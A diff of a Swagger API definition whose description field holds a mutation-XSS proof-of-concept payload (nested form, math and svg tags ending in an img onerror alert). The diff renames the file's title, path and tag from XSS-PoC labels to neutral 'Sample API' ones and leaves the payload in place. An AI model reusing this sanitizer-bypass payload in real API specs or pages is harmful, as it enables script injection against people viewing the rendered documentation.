@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS POC by Gee!
+  title: Sample API!
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS POC by Gee!') src=1>"></form>
   version: production
@@ -14,13 +14,13 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /API:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - DOM
+        - Demo
       operationId: findAccounts
       summary: Finds all accounts
   '/demo/demoid/{id}':
